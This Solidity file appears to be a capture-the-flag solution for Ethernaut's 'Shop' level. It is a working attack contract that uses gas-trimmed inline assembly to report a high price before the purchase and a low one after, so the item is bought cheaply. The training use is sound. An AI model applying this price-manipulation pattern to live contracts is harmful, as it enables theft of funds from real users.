// # Ethernaut 21: Shop

// Since the Istanbul fork [repriced the SLOAD instruction from 200 to 800 gas](https://eips.ethereum.org/EIPS/eip-1884),
// solutions that implement below attack without using assembly to shave off a few units of gas
// fail to execute it within the allowance of 3000 gas. (See discussion [here](https://github.com/OpenZeppelin/ethernaut/issues/156#issuecomment-609374838).)
//
// In particular, what we're doing here to execute within the limit:
//   - not loading `Shop` instance address from storage
//   - handling 'call data routing' ourselves
//   - implementing `if (shop.isSold()) { return 1; } else { return 100; }` in assembly to get rid of boilerplate

pragma solidity ^0.6.0;

import "./21_Shop.sol";

contract ShopAttack {
    fallback () external {
        Shop shop = Shop(0x708fA82359E24DB720C75f9b4D202Ad12D0E45Be);
        // Call without call data issues `Shop.buy`.
        if (msg.data.length == 0) {
            shop.buy.gas(100000)();
        }
        // Any other call data is interpreted as calling `price()`.
        else {
            assembly {
                /* 'isSold()' signature */
                mstore(0, 0xe852e74100000000000000000000000000000000000000000000000000000000)
                let result := staticcall(
                    3000,   // gas
                    shop,   // address
                    0,      // input ptr
                    4,      // input size
                    0,      // output ptr
                    32      // output size
                )
                switch mload(0) case 0 { mstore(0, 100) } default { mstore(0, 1) }
                return(0, 32)
            }
        }
    }
}
